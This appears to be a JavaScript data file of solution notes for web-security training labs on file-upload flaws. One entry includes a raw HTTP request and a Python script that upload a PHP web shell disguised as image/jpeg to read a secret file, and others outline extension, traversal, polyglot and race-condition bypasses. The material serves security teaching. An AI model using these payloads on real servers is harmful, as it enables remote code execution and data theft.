export default {
  'file-upload-lab-file-upload-remote-code-execution-via-web-shell-upload': {
    note: 'Avatar uploads accept `.php` and serve it from an executable directory; upload a shell and read Carlos\'s secret.'
  },
  'file-upload-lab-file-upload-web-shell-upload-via-content-type-restriction-bypass': {
    note: 'The server trusts the multipart `Content-Type`; send a PHP file declared as `image/jpeg`.',
    work: {
      hints: [
        'Upload a harmless `.php` file and inspect the response. The rejection mentions the file type, not the extension.',
        'The check reads the multipart part header. Change `Content-Type: application/x-php` to `image/jpeg` without changing the bytes.',
        'Upload `exploit.php` containing `<?php echo file_get_contents(\'/home/carlos/secret\'); ?>` as `image/jpeg`, then GET `/files/avatars/exploit.php`.'
      ],
      approach:
        'Client-declared metadata used as a security decision. The multipart `Content-Type` is an assertion by the uploader, not a property of the bytes. The server validates the assertion and then writes the file into a directory that executes PHP.',
      request: `POST /my-account/avatar HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: multipart/form-data; boundary=----X
Cookie: session=YOUR-SESSION

------X
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------X
Content-Disposition: form-data; name="user"

wiener
------X
Content-Disposition: form-data; name="csrf"

TOKEN
------X--`,
      tokens: [
        ['filename="exploit.php"', 'The extension that decides execution once the file is in the avatar directory.'],
        ['Content-Type: image/jpeg', 'A client-controlled claim. The server checks this string instead of parsing the bytes.'],
        ['<?php ... ?>', 'PHP open/close tags. The web server hands the file to the PHP interpreter because of the .php extension.'],
        ['file_get_contents', 'Reads Carlos\'s secret; `echo` writes it into the HTTP response.'],
        ['/files/avatars/', 'The public path that maps to the writable upload directory.']
      ],
      script: `import sys, requests

host = sys.argv[1]
base = f"https://{host}"
s = requests.Session()
page = s.get(f"{base}/my-account", timeout=20).text
csrf = page.split('name="csrf" value="')[1].split('"')[0]
files = {"avatar": ("exploit.php", "<?php echo file_get_contents('/home/carlos/secret'); ?>", "image/jpeg")}
r = s.post(f"{base}/my-account/avatar", data={"user": "wiener", "csrf": csrf}, files=files, timeout=20)
print("upload:", r.status_code)
print(s.get(f"{base}/files/avatars/exploit.php", timeout=20).text.strip())`
    }
  },
  'file-upload-lab-file-upload-web-shell-upload-via-path-traversal': {
    note: 'The filename is used verbatim; `../` writes the shell into a parent directory that the server executes or serves.'
  },
  'file-upload-lab-file-upload-web-shell-upload-via-extension-blacklist-bypass': {
    note: 'The `.php` blocklist is incomplete: upload `.phtml`, or a `.htaccess` that maps another extension to PHP.'
  },
  'file-upload-lab-file-upload-web-shell-upload-via-obfuscated-file-extension': {
    note: 'The extension check is confused by a null byte or trailing characters that the web server ignores.'
  },
  'file-upload-lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload': {
    note: 'Magic bytes are checked, so build a GIF/JPEG polyglot whose comment segment still contains PHP.'
  },
  'file-upload-lab-file-upload-web-shell-upload-via-race-condition': {
    note: 'The file is briefly reachable before validation deletes it; race the upload and the fetch to execute it.'
  }
}
